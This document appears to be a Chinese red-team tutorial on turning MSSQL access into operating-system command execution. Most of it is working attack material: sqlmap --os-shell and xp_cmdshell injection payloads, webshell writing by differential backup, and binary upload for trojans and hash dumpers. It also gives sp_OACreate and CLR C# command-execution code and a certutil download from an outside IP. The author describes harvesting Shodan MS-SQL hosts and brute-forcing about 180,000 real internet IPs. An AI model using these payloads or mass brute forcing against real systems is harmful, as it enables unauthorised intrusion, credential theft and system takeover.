0x00 前言
=======

数据库是存放数据的仓库。它的存储空间很大，可以存放百万条、千万条、上亿条数据。但是数据库并不是随意地将数据进行存放，是有一定的规则的，否则查询的效率会很低。当今世界是一个充满着数据的互联网世界，充斥着大量的数据。即这个互联网世界就是数据世界。数据的来源有很多，比如出行记录、消费记录、浏览的网页、发送的消息等等。除了文本类型的数据，图像、音乐、声音都是数据。

几乎每个网站，每个企业都会用到数据库，网络边界上也存在大量的数据库服务，对于一名红队成员来说，获得数据库的访问权限，或者执行任意数据库查询语句是比较容易的事儿，比如数据库服务的弱口令、某个网站接口的 SQL 注入漏洞等，但是如何通过数据库来获得操作系统的权限， 执行任意系统命令，这就成了考验红队成员能力的一个重要技术，本文重点就梳理那些数据库系统，通过执行 SQL 语句就可以达到执行系统命令的目的。

0x01 如何获取数据库的功能权限
=================

在实现从数据库功能到系统权限的目标之前，首先需要获得数据库的访问和操作权限，那么如何做呢？

1.1 数据库口令枚举
-----------

这个很好理解，当数据库的端口对外开放，任何互联网上的人都可以访问该端口时，那么我们就可以对其进行暴力破解，是否能破解成功，取决于其口令设置的复杂度，以及我们自己密码字典是否覆盖其密码，否则是无法成功暴力破解的，如果你已经获得了内网的权限，内网所有的数据库端口默认都是可以访问的，除非做网络隔离，无法跨越网段，所以对于口令枚举这种方式，在内网横向移动时是一个不错的方法。

### 1.1.1 工具一：fscan

一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。支持主机存活探测、端口扫描、常见服务的爆破、ms17010、redis批量写公钥、计划任务反弹shell、读取win网卡信息、web指纹识别、web漏洞扫描、netbios探测、域控识别等功能。项目地址：

<https://github.com/shadow1ng/fscan>

适合内网，扫描外网服务器，丢包严重。

### 1.1.2 工具二：SNETCracker

超级弱口令检查工具是一款Windows平台的弱口令审计工具，支持批量多线程检查，可快速发现弱密码、弱口令账号，密码支持和用户名结合进行检查，大大提高成功率，支持自定义服务端口和字典。 工具采用C#开发，需要安装.NET Framework 4.0，工具目前支持SSH、RDP、SMB、MySQL、SQLServer、Oracle、FTP、MongoDB、Memcached、PostgreSQL、Telnet、SMTP、SMTP\_SSL、POP3、POP3\_SSL、IMAP、IMAP\_SSL、SVN、VNC、Redis等服务的弱口令检查工作。 工具特点：

1.支持多种常见服务的口令破解，支持RDP（3389远程桌面）弱口令检查。

2.支持批量导入IP地址或设置IP段，同时进行多个服务的弱口令检查。

3.程序自带端口扫描功能，可以不借助第三方端口扫描工具进行检查。

4.支持自定义检查的口令，自定义端口。

<https://github.com/shack2/SNETCracker>

使用比较简单，界面程序，速度和准确度都不错，推荐使用。

1.2 SQL注入漏洞利用
-------------

从以往的经验来看，SQL 注入漏洞一直以来都是比较危险且出现频繁的漏洞，往往由于程序员在实现数据库查询功能代码时，采用拼接字符串的方式，将参数带入查询语句中，从而导致 SQL 注入漏洞的产生，可以让攻击者利用该漏洞执行任意 SQL 语句，到目前为止，网络边界上的 web 系统还存在大量该漏洞，还可谓漏洞的主力。

### 1.2.1 工具一：Xray（删除漏洞批量检测）

xray 是一款功能强大的安全评估工具，设计理念是发最少的包，做最好的探测，可检测漏洞包括 XSS、SQL 注入、命令注入、目录枚举等主流漏洞，以及集成 POC 执行框架，可任意扩展漏洞 POC，实现漏洞批量检测的目的，项目地址：

<https://docs.xray.cool/#/>

### 1.2.2 工具二：SQLMap（擅长 SQL 注入漏洞深入检测和利用）

SQLMap 是一个开源的渗透测试工具，可以用来进行自动化检测，利用 SQL 注入漏洞，获取数据库服务器的权限。它具有功能强大的检测引擎，针对各种不同类型数据库的渗透测试的功能选项，包括获取数据库中存储的数据，访问操作系统文件甚至可以通过外带数据连接的方式执行操作系统命令。项目地址：  
<http://sqlmap.org/>

1.3 多种数据库管理工具
-------------

### 1.3.1 工具一：HeidiSQL

HeidiSQL 是免费软件，其目标是易于学习。“Heidi”让您可以从运行 MariaDB、MySQL、Microsoft SQL、PostgreSQL 和 SQLite 数据库系统之一的计算机上查看和编辑数据和结构。HeidiSQL 由 Ansgar 于 2002 年发明，属于全球最流行的 MariaDB 和 MySQL 工具。官网地址：  
<https://www.heidisql.com/>

1.4 操作需要
--------

提前部署 redis、postgresql、mysql、mssql 数据库环境。

0x02 实战测试
=========

MSSQL 是指微软的 SQLServer 数据库服务器，它是一个数据库平台，提供数据库的从服务器到终端的完整的解决方案，其中数据库服务器部分，是一个数据库管理系统，用于建立、使用和维护数据库。

在学习这个之前，需要先部署一个 MSSQL 服务器，具体安装过程就不多说了，我这里搭建了两套系统：

1、Windows 2008 + mssql 2005  
2、Windows 2012 + mysql 2008

其他的系统和服务器版本，可以在实际的渗透过程中，遇到相关环境在进行深入研究，这里只是为了探究技术实现，不同版本，可能会有些许差别。

2.1 不同方式执行数据库语句
---------------

### 2.1.1 方法一：利用 SQL 注入漏洞

执行数据库语句有多种形态，比如通过 SQL 注入漏洞执行语句、通过数据库连接器执行 SQL 语句，针对 SQL 注入，可以借助 SQLMap 工具来实现，自动化获取系统权限，执行系统命令，比如：

```php
1.  sqlmap -u https://www.xazlsec.com/vuln.aspx?id=1 -p id --os-shell  
```

或者使用 burp 手动提交，执行系统命令，比如 payload：

```php
1.  CursoTextBox=1%';EXEC master.dbo.xp\_cmdshell 'whoami';--  
```

有的时候，sql 注入可以执行语句但是无法直接回显执行内容的情况下，可以借助系统下载工具，直接远程下载恶意文件并执行，获得 shell 之后继续操作。

### 2.1.2 方法二：利用数据库管理工具

SQL 语句执行工具

**工具一：官方管理器**

微软官方 MSSQL 数据库管理工具 SQL Server Management Studio，输入服务器地址、账号、密码登录：

![1.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-f8b685f36e293e78594c3d0a8fe4101af7387a82.png)

**工具二：开源小工具 NewOSql**（体积小，便于上传）

适用于内网渗透中，扫描 mssql 弱口令，以及利用执行任意数据库语句，项目地址：  
<https://github.com/flight-tom/NewOSql>

![2.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-fd4f2b21b88af904b8749879a4b58e33142aa0e2.png)

比如，新建一个 sql 文件，保存一下内容：

```php
1.  EXEC master.dbo.xp\_cmdshell 'certutil -urlcache f http://49.232.147.136:9999/testosql';  
```

然后执行命令：

```php
1.  oSQL.exe -S 192.168.142.113 -U sa -P admin@123 -o .\\logs.txt -i whoami.sql -d master -e .\\excel.csv
```

在远程服务器能够看到一个链接的信息，如图：

![3.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-908d5649678857bcc9925765b15560141173005c.png)

只要有账号密码信息，就可以利用这个小工具执行任意数据库的语句。

**工具三：微软官方 sqlcmd**（官方软件，需要安装必要依赖）

安装需要：ODBC Driver for SQL Server 和 sqlcmd Utility，下载地址：

[https://docs.microsoft.com/en-us/previous-versions/sql/2014/tools/sqlcmd-utility?view=sql-server-2014&amp;preserve-view=true](https://docs.microsoft.com/en-us/previous-versions/sql/2014/tools/sqlcmd-utility?view=sql-server-2014&preserve-view=true)

<https://docs.microsoft.com/en-us/sql/connect/odbc/download-odbc-driver-for-sql-server?view=sql-server-ver15>

连接命令：

```php
1.  sqlcmd -S 192.168.142.113 -U sa -P admin@123  
```

输入命令之后需要输入 go 执行该命令，如图：

![19.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-e612a5e9bad26bfb14d08d6dee80cf00a339fb03.png)

具体其他的利用方式，后续在实际场景中进行介绍。

2.3 利用 MSSQL 自身功能进行文件操作
-----------------------

文件操作都需要将内容转为 16 进制，脚本参考：

```php
1.  #!/usr/bin/env python  
2.  # coding=utf-8  
3.    
4.  import urllib  
5.  import binascii  
6.  import sys  
7.  import os  
8.    
9.  def str2hex(string):  
10.     hexstr=binascii.b2a\_hex(bytes(string, encoding='utf-8'))  
11.     out = bytes("0x", encoding='utf-8')  
12.     out = out + hexstr  
13.     print(out)  
14.   
15. def b2a(filename):  
16.     with open(filename,'rb') as f:  
17.         hexstr=binascii.b2a\_hex(f.read())  
18.         out = bytes("0x", encoding='utf-8')  
19.         out = out + hexstr  
20.         print(out)  
21.           
22. **if** \_\_name\_\_=="\_\_main\_\_":  
23.     filename  = sys.argv\[1\]  
24.     **if** os.path.exists(filename):  
25.         b2a(filename)  
26.     **else**:  
27.         str2hex(filename)  
```

比如将字符串 "VulnTest" 转为 16 进制串：

```php
1.  D:\\tools\\sqlhack>python s2bin.py VulnTest  
2.  b'0x56756c6e54657374'
```

### 2.3.1 场景一：利用差异备份获取 webshell

接下来就尝试使用 SQL 语句来将字符串内容 VulnTest 写入 c 盘的根目录（后续根据需要，写入 web 目录即可），文件名为 vuln.txt，使用脚本将路径 c:\\vuln.txt 转为 16 进制串：

```php
1.  0x633a5c76756c6e2e747874  
```

设置一个备份文件名 c:\\db.bak，通用要将其转为 16 进制：

```php
1.  0x633a5c64622e62616b  
```

然后开始差异备份，可以先创建一个数据库，减小备份的体积：

```php
1.  create database vulntest;  
2.  use vulntest;  
```

第一步：备份数据库到 c:\\db.bak:

```php
1.  backup database vulntest to disk = 'c:\\ddd.bak'  
```

第二步：创建一个表 vulntest：

```php
1.  create table \[dbo\].\[vulntest\] (\[cmd\] \[image\]);    
```

第三步：将文件内容插入到数据表中：

```php
1.  insert into vulntest(cmd) values(0x56756c6e54657374);  
```

第四步：差异备份：

```php
1.  backup database vulntest to disk='c:\\vuln.txt' WITH DIFFERENTIAL,FORMAT;  
```

以上命令可以合在一起执行，也可以单独执行，成功执行之后，会在 c 盘下生成两个文件，一个是备份的 ddd.bak，一个是 vuln.txt，看看 vuln.txt 中是否包含关键词 VulnTest:

![3-2.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-6f79534042b7723c3f190ef07e6dfc6d654299cd.png)

这种对于利用 sql 注入上传 webshell 是比较有用的。

### 2.3.2 场景二：上传二进制文件到数据库服务器

当我们获得一个数据库服务器的 sa 权限之后，需要将我们的木马文件或者抓 hash 文件传入服务器，然后执行该程序来获得一个通道或者抓取当前用户的密码信息，这个时候，就需要用到利用 MSSQL 数据库上传二进制文件的功能。

第一步，启用 Ole Automation Procedures：

```php
1.  \-- Step 1: Enable Ole Automation Procedures  
2.  sp\_configure 'show advanced options', 1;  
3.  RECONFIGURE;  
4.  sp\_configure 'Ole Automation Procedures', 1;  
5.  RECONFIGURE;  
```

第二步将 test 写入到 c 盘的 info.txt 中：

```php
1.  \-- Step 2: Write Text File  
2.  DECLARE @OLE **INT**  
3.  DECLARE @FileID **INT**  
4.  EXECUTE sp\_OACreate 'Scripting.FileSystemObject', @OLE OUT  
5.  EXECUTE sp\_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\\info.txt', 8, 1  
6.  EXECUTE sp\_OAMethod @FileID, 'WriteLine', Null, 'test'  
7.  EXECUTE sp\_OADestroy @FileID  
8.  EXECUTE sp\_OADestroy @OLE  
```

在目标服务器 c 盘下可以看到最新写入的文件，如果想要写入二进制文件呢？首先将二进制文件，转为 mssql 支持的 hex 字符串，执行上面提供的脚本即可，然后替换下面的 0xhex, 执行下面的语句：

```php
1.  DECLARE @ObjectToken **INT**  
2.  EXEC sp\_OACreate 'ADODB.Stream', @ObjectToken OUTPUT  
3.  EXEC sp\_OASetProperty @ObjectToken, 'Type', 1  
4.  EXEC sp\_OAMethod @ObjectToken, 'Open'  
5.  EXEC sp\_OAMethod @ObjectToken, 'Write', NULL, 0xhex  
6.  EXEC sp\_OAMethod @ObjectToken, 'SaveToFile', NULL, 'c:\\Test.exe', 2  
7.  EXEC sp\_OAMethod @ObjectToken, 'Close'  
8.  EXEC sp\_OADestroy @ObjectToken  
```

执行成功后，在服务器的 c 盘下，然后就可以执行该工具。使用完之后，可以将之前开启的功能恢复，命令：

```php
1.  \-- Step 3: Disable Ole Automation Procedures  
2.  sp\_configure 'show advanced options', 1;  
3.  RECONFIGURE;  
4.  sp\_configure 'Ole Automation Procedures', 0;  
5.  RECONFIGURE;  
```

2.4 利用 MSSQL 的权限执行系统命令
----------------------

### 2.4.1 场景一：利用 xp\_cmdshell 执行系统命令

xp\_cmdshell 是 Sql Server 中的一个组件，我们可以用它来执行系统命令。利用前提是数据库服务未被降权，可以执行任意存储过程，在利用之前需要先判断 xp\_cmdshell 的状态，是否已经开启，默认是关闭的，命令如下：

```php
1. select \* from master.dbo.sysobjects where xtype='x' and name='xp\_cmdshell';  
```

如图（已开启）：

![4.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-924f9c1113f0105176ad685c0d0b7bf568cdd1b2.png)

如果未开启的话，需要执行下面的命令进行开启：

```php
1. EXEC sp\_configure 'show advanced options', 1;RECONFIGURE;EXEC sp\_configure 'xp\_cmdshell', 1;RECONFIGURE;  
```

开启之后就可以执行任意的系统命令，比如：

```php
1. exec master..xp\_cmdshell 'whoami'  
```

可以看到当前用户权限是 system 权限，也有可能是 network service 权限，这个是跟安装过程中，设置启动服务的用户权限相关，建议使用 network service 权限，毕竟如果是 system 权限，那么对于攻击者而言都省下提权的操作了，如图：

![5.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-c35e63d8fff26cd68c2c9700e0ef500fa938e1f0.png)

接下来就可以执行任意系统命令，本专题的目标已经达成。题外话，实际的目标中管理员可能删除这个扩展，当然，我们也可以通过 xplog70.dll 来进行恢复，命令如下：

```php
1. Exec master.dbo.sp\_addextendedproc 'xp\_cmdshell','C:\\\\Program Files (x86)\\\\Microsoft SQL Server\\\\MSSQL.1\\\\MSSQL\\\\Binn\\\\xplog70.dll';  
```

xplog70.dll 通常在 MSSQL 的安装目录下，找到实际安装位置，替换之后，执行上面的命令即可。

**2.4.2** **场景二：利用 com 组件 SP\_OACREATE 来执行命令**

利用 SP\_OACREATE 之前，需要先确认该组件是否启用，查询命令：

```php
select \* from master.dbo.sysobjects where xtype='x' and name='SP\_OACREATE';
```

![6.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-64f335e4fb925de4d2600ad57ef0da0321b6ce35.png)

能搜索出结果，说明组件已开启，如果没有开启的情况下，可以使用下面的命令进行启用：

```php
1. EXEC sp\_configure 'show advanced options', 1; RECONFIGURE WITH OVERRIDE; EXEC sp\_configure 'Ole Automation Procedures', 1; RECONFIGURE WITH OVERRIDE;  
```

那么接下来就可以利用这个组件进行命令执行了，这个没有 xp\_cmdshell 好用的地方就是不能回显，可以将执行命令的结果进行重定向，然后再进行查看，比如命令：

```php
1. declare @shell **int** exec sp\_oacreate 'wscript.shell',@shell output exec sp\_oamethod @shell,'run',null,'c:\\windows\\system32\\cmd.exe /c whoami >c:\\\\test.txt'  
```

执行成功后，不会有内容返回，如图：

![7.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-862658ab598031a7dd17d482d1894e1fa33fd1db.png)

接下来去看看 c 盘下的 test.txt 内容：

![8.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-d8a5efa75c2fae5d0329045dca976e9b3f6b07a3.png)

可以看到命令已经执行成功，并且创建了文件，当前系统管理员是系统权限。

### 2.4.3 场景三：利用 CLR 执行系统命令

这种方法比较麻烦，需要自行根据目标创建项目代码，然后进行编译，相关描述如下：

1. CLR 微软官方把他称为公共语言运行时，从 SQL Server 2005 (9.x) 开始，SQL Server 集成了用于 Microsoft Windows 的 .NET Framework 的公共语言运行时 (CLR) 组件。 这意味着现在可以使用任何 .NET Framework 语言（包括 Microsoft Visual Basic .NET 和 Microsoft Visual C#）来编写存储过程、触发器、用户定义类型、用户定义函数、用户定义聚合和流式表值函数。

利用之前首先使用 VS 创建一个 MSSQL 的项目，我使用的是 VS 2015，如图：

![10.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-9fa5261561e937922522da20dc5af880c2a66c4c.png)

针对不同的目标数据库版本需要进行配置，右键项目，点击属性，然后选择对应数据库版本，如图：

![11.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-613d20ea5fddd8c820b8373906830be08415d48f.png)

我的测试目标是 mssql 2005，所以选择 SQL server 2005，最好各个版本都创建一份，以后直接使用即可。然后右键项目，添加新建项，然后选择 SQL CLR C# 存储过程，如图：

![12.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-13c956d96f05c92c805227d7693fe718aa4e4671.png)

将下面的代码复制进去：

```php
1.  **using** System;  
2.  **using** System.Data;  
3.  **using** System.Data.SqlClient;  
4.  **using** System.Data.SqlTypes;  
5.  **using** System.Diagnostics;  
6.  **using** System.Text;  
7.  **using** Microsoft.SqlServer.Server;  
8.    
9.  **public** partial **class** StoredProcedures  
10. {  
11.     \[Microsoft.SqlServer.Server.SqlProcedure\]  
12.     **public** **static** **void** ExecCommand (string cmd)  
13.     {  
14.         // 在此处放置代码  
15.        SqlContext.Pipe.Send("Command is running, please wait.");  

16.        SqlContext.Pipe.Send(RunCommand("cmd.exe", " /c " + cmd));  

17.     }  
18.     **public** **static** string RunCommand(string filename,string arguments)  
19.     {  
20.         var process = **new** Process();  
21.   
22.         process.StartInfo.FileName = filename;  
23.         **if** (!string.IsNullOrEmpty(arguments))  
24.         {  
25.             process.StartInfo.Arguments = arguments;  
26.         }  
27.   
28.         process.StartInfo.CreateNoWindow = **true**;  
29.         process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden; 
30.         process.StartInfo.UseShellExecute = **false**;  
31.   
32.         process.StartInfo.RedirectStandardError = **true**;  
33.         process.StartInfo.RedirectStandardOutput = **true**;  
34.         var stdOutput = **new** StringBuilder();  
35.         process.OutputDataReceived += (sender, args) => stdOutput.AppendLine(args.Data);  
36.         string stdError = null;  
37.         **try**  
38.         {  
39.             process.Start();  
40.             process.BeginOutputReadLine();  
41.             stdError = process.StandardError.ReadToEnd();  
42.             process.WaitForExit();  
43.         }  
44.         **catch** (Exception e)  
45.         {  
46.             SqlContext.Pipe.Send(e.Message);  
47.         }  
48.   
49.         **if** (process.ExitCode == 0)  
50.         {  
51.             SqlContext.Pipe.Send(stdOutput.ToString());  
52.         }  
53.         **else**  
54.         {  
55.             var message = **new** StringBuilder();  
56.   
57.             **if** (!string.IsNullOrEmpty(stdError))  
58.             {  
59.                 message.AppendLine(stdError);  
60.             }  
61.   
62.             **if** (stdOutput.Length != 0)  
63.             {  
64.                 message.AppendLine("Std output:");  
65.                 message.AppendLine(stdOutput.ToString());  
66.             }  
67.     SqlContext.Pipe.Send(filename + arguments + " finished with exit code = " + process.ExitCode + ": " + message);  

68.         }  
69.         **return** stdOutput.ToString();  
70.     }  
71. } 
```

然后编译项目，之后到编译目录下可以看到一个dacpac后缀的文件，如图：

![13.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-c6f666bf0d61a1f91db42941598d3aa5467f88bb.png)  
将该文件解压之后，会得到几个 xml 文件，如图：

![14.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-a8d6359ae6422e2ea20088c62a043bd88c85fc8b.png)

打开 model.xml，其中有两个长的 hex 内容，提取 0x4D5A 开头的那个，如图：

![15.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-a05909653ee15f1204e34844f4e82393a6c25a69.png)

然后替换到下面的 SQL 语句中：

```php
1.  CREATE ASSEMBLY \[ExecCode\]  
2.      AUTHORIZATION \[dbo\]  
3.      FROM 0x4D5A90000300000004000000FFFF0000B8000000000000004000000000000000000000000 …… 000000
4.      WITH PERMISSION\_SET = UNSAFE;  
5.  GO 
```

接下来使用数据库执行该命令，如图：

![16.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-b8a761e579ccb552816cbf2532e18e4cf5225217.png)

首次执行报错，可以使用下面的命令开启 clr 功能：

```php
1.  sp\_configure 'clr enabled', 1  
2.  GO  
3.  RECONFIGURE  
4.  GO 
```

使用下面的命令让导入的不安全程序集标记为安全：

```php
1.  ALTER DATABASE master SET TRUSTWORTHY ON;  
```

然后重启 MSSQL 服务才能生效，在实际利用中还是比较鸡肋，执行之前报错的语句成功之后，执行：

```php
1.  CREATE PROCEDURE \[dbo\].\[ExecCommand\]  
2.  @cmd NVARCHAR (MAX)  
3.  AS EXTERNAL NAME \[ExecCode\].\[StoredProcedures\].\[ExecCommand\]  
4.  go
```

![17.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-92b42431613a6f05309655ea333da3fd4065aae7.png)

现在就可以执行系统命令了，命令如下：

```php
1.  exec dbo.ExecCommand "whoami";  
```

![18.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-a3d31ca6c64ddf1d55c61bc26ac72bee69e3b6d6.png)  
这种方法也不是万能的，如果目标开启了 clr 的功能，是可以使用的，如果没有开启，自行开启需要重启服务，就比较难以控制了。

2.5 外网环境下收集目标并进行弱口令检测
---------------------

### 2.5.1 第一步：使用网络空间搜索引擎，获取全网开放 1433 端口的 IP 列表

首先安装 shodan 的库:

pip install shodan

然后初始化 key ，然后下载相关数据：

```php
1.  shodan init shodanAPIKEY  
2.  shodan download --limit 1000000 mysql.txt product:"MS-SQL"  
```

### 2.5.2 第二步：使用 PortBrute 对其进行暴力枚举尝试

外网爆破可以使用这种方式，如果是内网尝试爆破弱口令，不宜使用批量扫描工具，建议使用 osql、sqlcmd 等原生工具，进行单个账号密码尝试，以减少被流量审计的可能性。

关于 MSSQL 的弱口令问题，外网存在的可能性比较小，我尝试收集了 18 万 IP，使用弱口令字典：sa:sa

首先将目标 IP 列表整理成 ip:port 格式，然后执行命令：

```php
1.  PortBruteWin.exe -f mssqlipport.txt -u user.txt -p pass.txt -t 100  
```

发现若干存在弱口令的问题，接下来就可以进行实战演练了。

### 2.5.3 第三步：尝试使用 xp\_cmdshell 执行系统命令

首先看看当前数据库的版本信息，使用命令 SELECT @@version，发现数据库版本为 MSSQL 2012，执行下面的命令查看是否存在 xp\_cmdshell：

```php
1.  PortBruteWin.exe -f mssqlipport.txt -u user.txt -p pass.txt -t 100
```

![21.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-4064ebac93519d1f867111e1d577db199e77d3f1.png)  
看到是存在的，那么直接使用 xp\_cmdshell 执行命令：

```php
1.  exec master..xp\_cmdshell 'whoami'  
```

![22.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-a7e4cd576d1f39969bf4e490ecc38c7ffdf2bf2d.png)

发现报错了，去看看是什么原因导致的，谷歌搜索 mssql error 15121,网上的资料说是需要启动 xp\_cmdshell，执行语句：

```php
1.  EXEC sp\_configure 'show advanced options', 1  
2.  RECONFIGURE  
3.  EXEC sp\_configure 'xp\_cmdshell', 1  
4.  RECONFIGURE  
```

![23.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-afbac299718a10177a04e496bb063ea8e6ad4372.png)  
发现又报错了，这次是 5808，再次搜索看看问题，可能目标系统是 mssql 2008 以上，所以需要改为下面的命令，就可以执行成功。

```php
1.  EXEC sp\_configure 'show advanced options', 1  
2.  RECONFIGURE WITH OVERRIDE  
3.  EXEC sp\_configure 'xp\_cmdshell', 1  
4.  RECONFIGURE WITH OVERRIDE  
5.  EXEC sp\_configure 'show advanced options', 0  
6.  RECONFIGURE WITH OVERRIDE  
```

**执行结果：**

/\* 受影响记录行数: 0 已找到记录行: 0 警告: 0 持续时间 1 查询: 0.062 秒. \*/

虽然更新成功但是并未有任何改变，再次执行命令，发现还是不行，再次搜素 xp\_cmdshell. A call to 'CreateProcess' failed with error code: '5'相关问题，发现可能是权限不够，sa 账号可能被降权了，无法直接利用这个方法执行系统命令。那么还能做什么呢？列目录试试：

```php
1.  exec xp\_subdirs 'C:';       #列目录  
2.  exec xp\_dirtree 'c:',1,1   #列文件  
```

![24.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-504805d77205ac7e3798a83c9156e49352984fd6.png)  
可以看到有 360 的目录，之前无法执行 xp\_cmdshell 的原因，可能是杀毒软件给拦截了，那么在进行测试时，可以先看看目标是否存在杀毒软件之类的防护系统，如果有，大概率是无法做更深入的操作的。试试读文件：

```php
1.  create table cmd (a text);  #创建一个表  
2. BULK INSERT cmd FROM ‘c:/RlgwMCS.ini’ WITH ( FIELDTERMINATOR = ‘n’, ROWTERMINATOR = ‘nn’ ) #将文件存入数据库表中  
3.  select \* from cmd    #查询内容  
```

![25.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-4e61a4725e039cb5e0e04bf930a55f44807459fb.png)  
这个读文件的能力其实已经可以把系统上大部分关键敏感信息给读取到了。

0x03 总结
=======

本文主要讲了针对 MSSQL 数据库的利用方式，在发现一个 MSSQL 弱口令的服务器之后，如何执行系统命令，从而获取系统权限，除了 MSSQL 能利用来执行系统命令外，还有 Mysql\\redis\\PostgreSQL 等数据库可以利用。